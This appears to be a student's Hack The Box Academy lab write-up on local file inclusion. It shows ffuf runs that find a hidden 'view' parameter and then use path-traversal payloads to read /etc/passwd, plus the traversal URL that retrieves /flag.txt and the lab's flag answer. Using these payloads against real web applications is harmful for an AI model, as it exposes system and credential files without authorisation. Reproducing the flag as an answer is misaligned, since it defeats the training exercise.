# Section 08: Log Poisoning

Module: 20. File Inclusion

---

## Questions & Answers

### 1. Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt

Context:
- Fuzzing for the parameters:
```bash
┌─[eu-academy-2]─[10.10.15.146]─[htb-ac-2162140@htb-lszxre5vh3-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154.57.164.82:31087/index.php?FUZZ=value' -fs 2309

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://154.57.164.82:31087/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2309
________________________________________________

view                    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 169ms]
:: Progress: [6453/6453] :: Job [1/1] :: 130 req/sec :: Duration: [0:00:56] :: Errors: 1 ::
```
- Found `view`, emunerating the parameters:
```bash
┌─[eu-academy-2]─[10.10.15.146]─[htb-ac-2162140@htb-lszxre5vh3-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.82:31087/index.php?view=FUZZ' -fs 1935

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://154.57.164.82:31087/index.php?view=FUZZ
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1935
________________________________________________

../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 171ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 169ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 168ms]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 169ms]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 168ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 694ms]
:: Progress: [930/930] :: Job [1/1] :: 40 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```
- Got the flag: `http://154.57.164.82:31087/?view=../../../../../../../../../../../../../../../../../../../../../flag.txt`

**Answer:** `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}`

---

[Back to Module Index](./README.md)
